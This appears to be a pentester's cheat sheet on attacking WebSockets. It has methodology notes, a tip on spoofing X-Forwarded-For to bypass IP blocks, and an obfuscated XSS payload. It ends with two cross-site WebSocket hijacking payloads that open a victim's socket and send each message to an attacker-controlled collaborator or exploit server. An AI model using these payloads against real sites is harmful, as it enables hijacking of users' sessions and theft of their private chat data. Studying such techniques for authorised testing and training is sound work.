# Resources
- [Websockets Playlist - Popo Hack](https://www.youtube.com/playlist?list=PLzgroH3_jK2gNDZhR0oyY1FsshTgN215-)
- [Websockets Playlist - Jarno Timmermans](https://www.youtube.com/playlist?list=PLGb2cDlBWRUUqziKgNJXxhVodFFROqfeI)
# Bypassing Restrictions
- X-Forwarded-For header might be used to bypass IP address block
- Some payloads might need to be obfuscated
```html
<img src=1 oNeRrOr=alert`1`>
```
# Methodology
- Understand how the connection to the websocket is initiated and works
- Inspect the WebSocket history tab
- Look for XSS, SQLi, and any other vulnerability
## Cross-site WebSocket hijack (CSWSH)
- Check to see if the SameSite cookie is set and the value that it's set to
- Check if the endpoint has an unpredictable anti-CSRF token
- Check how to extract the chat's information
# Crafting payloads
- Payload might be html encoded by the frontend
    - To bypass, intercept the request and inject the malicios payload directly
- Encoding special characters:
    - If the payload is sent in a JSON object, escape double quotes " using backslashes \"
- Some payloads might need to be obfuscated
```html
<img src=1 oNeRrOr=alert`1`>
```
# Payloads
Payload 1
```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
Payload 2
```js
  let newWebSocket = new WebSocket('wss://url');

   newWebSocket.onopen = function () {
       newWebSocket.send("READY");
   };

   newWebSocket.onmessage = function (evt) {
       var message = evt.data;
       fetch('https://exploit-server-url/?message=' + btoa(message));
   };
```
